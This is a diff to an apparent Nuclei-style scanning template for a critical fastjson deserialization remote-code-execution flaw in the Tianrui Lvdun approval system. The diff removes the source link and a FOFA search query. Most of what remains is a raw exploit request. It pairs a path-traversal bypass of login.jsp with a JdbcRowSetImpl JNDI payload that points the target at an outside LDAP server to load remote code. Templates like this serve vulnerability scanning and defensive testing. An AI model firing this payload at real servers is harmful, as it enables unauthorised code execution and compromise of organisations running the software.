@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统 ext mergeQuery 存在fastjson反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/azu7ahcqqne2gack'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: azu7ahcqqne2gack
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - "POST /trwfe/login.jsp/.%2e/rest/ext/mergeQuery HTTP/1.1\nHost: {{Hostname}}\nX-Authorization: dir\nContent-Type: application/json\n\n[\n    {\n        \"requestType\": \"trusteeMsg\",\n        \"requestBody\": {\n            \"userId\": {\n                \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n                \"dataSourceName\": \"ldap://192.168.168.11:50389/165c51\",\n                \"autoCommit\": true\n            },\n            \"createTime\": \"2026-01-01\"\n        }\n    }\n]"
